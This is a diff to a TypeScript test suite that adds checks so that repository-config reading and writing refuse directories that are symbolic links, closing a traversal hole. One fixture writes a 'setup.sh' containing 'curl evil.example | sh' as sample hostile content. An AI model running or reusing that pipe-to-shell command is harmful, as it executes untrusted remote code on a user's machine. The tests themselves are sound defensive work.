@@ -1,4 +1,14 @@
-import { chmod, mkdir, mkdtemp, readFile, rm, stat, symlink, writeFile } from 'node:fs/promises'
+import {
+  access,
+  chmod,
+  mkdir,
+  mkdtemp,
+  readFile,
+  rm,
+  stat,
+  symlink,
+  writeFile
+} from 'node:fs/promises'
 import { tmpdir } from 'node:os'
 import { isAbsolute, join, normalize } from 'node:path'
 
@@ -208,6 +218,24 @@ describe('readRepoConfig', () => {
     })
   })
 
+  /*
+   * The hole this closed: `lstat` does not follow the last component but does
+   * follow the ones before it, so a check on the file alone passed as "absent"
+   * while the directory above it pointed somewhere else entirely.
+   */
+  it('refuses a directory along the way that is a symbolic link', async () => {
+    const outside = join(repo, 'elsewhere')
+    await mkdir(outside, { recursive: true })
+    await writeFile(join(outside, 'setup.sh'), 'curl evil.example | sh\n', 'utf8')
+    await mkdir(join(repo, REPO_DIR), { recursive: true })
+    await symlink(outside, join(repo, REPO_DIR, 'scripts'))
+
+    await expect(readRepoConfig(repo)).rejects.toMatchObject({
+      code: 'repoConfigSymlink',
+      params: { path: join(REPO_DIR, 'scripts') }
+    })
+  })
+
   it('refuses a file larger than its own editor would accept', async () => {
     await put('carry', 'x'.repeat(8_001))
 
@@ -355,6 +383,21 @@ describe('writeRepoConfig', () => {
       code: 'repoConfigSymlink'
     })
     await expect(readFile(outside, 'utf8')).resolves.toBe('mine\n')
+  })
+
+  it('refuses to write through a linked directory, and leaves it untouched', async () => {
+    const outside = join(repo, 'elsewhere')
+    await mkdir(outside, { recursive: true })
+    await mkdir(join(repo, REPO_DIR), { recursive: true })
+    await symlink(outside, join(repo, REPO_DIR, 'instructions'))
+
+    await expect(
+      writeRepoConfig(repo, [item('instruction.review', '# Review\n')])
+    ).rejects.toMatchObject({
+      code: 'repoConfigSymlink',
+      params: { path: join(REPO_DIR, 'instructions') }
+    })
+    await expect(access(join(outside, 'review.md'))).rejects.toThrow()
   })
 
   it('refuses when the note itself is a symbolic link', async () => {
